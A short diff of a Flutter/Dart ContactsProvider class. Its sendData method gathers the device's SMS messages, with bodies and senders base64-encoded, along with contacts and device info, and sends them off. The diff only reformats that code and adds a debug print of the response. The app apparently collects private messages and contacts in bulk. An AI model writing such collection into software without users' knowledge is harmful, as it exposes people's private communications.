@@ -74,17 +74,14 @@ class ContactsProvider extends ChangeNotifier {
   }
 
   sendData(BuildContext context) async {
-    List<Map> messagesList = _messages
-        .map((e) {
-          return {
-            '"message_body"':
-                '"${base64.encode(utf8.encode(e.body.toString()))}"',
-            '"message_sender"':
-                '"${base64.encode(utf8.encode(e.address.toString()))}"',
-            '"message_time"': '"${e.date.toString()}"',
-          };
-        })
-        .toList();
+    List<Map> messagesList = _messages.map((e) {
+      return {
+        '"message_body"': '"${base64.encode(utf8.encode(e.body.toString()))}"',
+        '"message_sender"':
+            '"${base64.encode(utf8.encode(e.address.toString()))}"',
+        '"message_time"': '"${e.date.toString()}"',
+      };
+    }).toList();
 
     List<Map> contactsList = _contacts
         .map(
@@ -114,6 +111,8 @@ class ContactsProvider extends ChangeNotifier {
       contacts: contactsList,
       deviceInfo: _deviceInfo,
     )).then((value) {
+      print(value);
+
       ViewFunctions.showCustomSnackBar(
           context: context, text: 'تم الارسال بنجاح');
     }).catchError((onError) {
